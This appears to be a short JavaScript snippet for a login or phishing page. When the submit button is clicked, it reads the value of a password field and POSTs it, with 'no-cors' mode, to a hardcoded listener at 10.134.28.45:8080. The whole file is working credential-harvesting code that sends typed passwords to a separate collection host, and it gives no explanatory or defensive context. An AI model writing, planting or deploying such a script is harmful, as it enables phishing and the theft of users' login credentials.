let pw = document.getElementById("pw");
let submit = document.getElementById("submit");

submit.addEventListener("click", function() {
    giveValue();
});

function giveValue() {

    let pwData = pw.value
    fetch("http://10.134.28.45:8080", {
        method: "POST",
        mode: "no-cors",
        body: pwData
    })
}